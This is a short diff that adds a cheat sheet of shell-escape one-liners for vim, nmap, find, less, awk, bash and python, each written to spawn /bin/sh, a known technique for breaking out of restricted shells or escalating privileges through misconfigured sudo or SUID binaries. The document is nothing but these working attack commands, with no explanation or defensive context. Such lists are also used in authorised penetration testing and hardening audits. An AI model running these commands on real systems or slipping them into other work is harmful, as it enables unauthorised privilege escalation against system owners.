@@ -1,0 +1,7 @@
+vim: vim -c ':set shell=/bin/sh' -c ':shell'
+nmap: nmap --interactive
+find: find . -exec /bin/sh \; -quit
+less: less /etc/profile
+awk: awk 'BEGIN {system("/bin/sh")}'
+bash: bash -p
+python: python3 -c 'import os; os.system("/bin/sh")'
